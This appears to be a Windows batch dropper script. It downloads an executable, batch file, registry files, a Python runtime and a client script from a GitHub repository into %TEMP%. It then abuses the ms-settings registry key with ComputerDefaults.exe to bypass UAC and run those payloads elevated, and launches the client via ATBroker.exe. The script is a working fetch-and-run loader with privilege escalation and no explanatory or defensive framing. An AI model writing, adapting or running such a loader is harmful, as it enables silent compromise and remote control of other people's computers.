curl -sS -L -o %TEMP%\fleur.exe https://github.com/repossess/fleur/raw/refs/heads/main/dependencies/fleur.exe
curl -sS -o %TEMP%\fleur.bat https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/fleur.bat && reg.exe add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command /ve /d "start /min cmd.exe /c %TEMP%\fleur.bat" /f > nul && reg.exe add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command /v "DelegateExecute" /t REG_SZ /d "" /f > nul&& C:\Windows\System32\ComputerDefaults.exe
timeout /t 10 /nobreak  > nul
curl -sS -o %TEMP%\fleur.reg https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/fleur.reg && reg.exe add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command /ve /d "C:\Windows\regedit.exe /s %TEMP%\fleur.reg" /f > nul && reg.exe add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command /v "DelegateExecute" /t REG_SZ /d "" /f  > nul && C:\Windows\System32\ComputerDefaults.exe
timeout /t 10 /nobreak  > nul
curl -sS -o %TEMP%\fleur2.reg https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/fleur2.reg && reg.exe add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command /ve /d "C:\Windows\regedit.exe /s %TEMP%\fleur2.reg"  > nul /f && reg.exe add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command /v "DelegateExecute" /t REG_SZ /d "" /f  > nul && C:\Windows\System32\ComputerDefaults.exe
set directoryPath=%TEMP%\python
if exist "%directoryPath%" (
	curl -sS -o %TEMP%\client.py https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/client_.py
	ATBroker.exe /start fleur
) else (
	curl -L -sS -o %TEMP%\python.zip https://github.com/repossess/fleur/raw/refs/heads/main/dependencies/python.zip
	powershell Expand-Archive -Path "%TEMP%\python.zip" -DestinationPath "%TEMP%"
	del %TEMP%\python.zip
	curl -sS -o %TEMP%\client.py https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/client_.py
	ATBroker.exe /start fleur
)
